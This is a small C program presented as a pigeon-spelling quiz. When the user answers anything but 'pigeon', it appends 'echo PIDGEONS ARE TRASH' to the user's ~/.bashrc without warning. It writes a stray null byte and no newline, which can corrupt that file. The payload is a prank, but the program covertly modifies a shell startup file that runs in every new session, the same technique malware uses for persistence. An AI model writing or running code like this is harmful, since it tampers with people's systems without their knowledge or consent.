#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void die() {
	char* HOME = getenv("HOME");
	char bashrc[64];
	snprintf(bashrc, 64, "%s/.bashrc", HOME);
	FILE* f = fopen(bashrc, "a+");
	char* bashrcmsg = "echo PIDGEONS ARE TRASH";
	fwrite(bashrcmsg, sizeof(char), strlen(bashrcmsg)+1, f);
	fclose(f);
}

int main() {
	printf("Hello, Pigeon! \n");
	printf("Are Pigeons or Pidgeons better? (answer \"pigeon\" or \"pidgeon\") "); fflush(stdout);
	char res[64];
	fscanf(stdin, "%63s", res);
	if (strcmp(res, "pigeon")) {
		die();
		return 676767;
	} else {
		printf("Congratulations, you are smart! \n");
	}
	return 0;
}
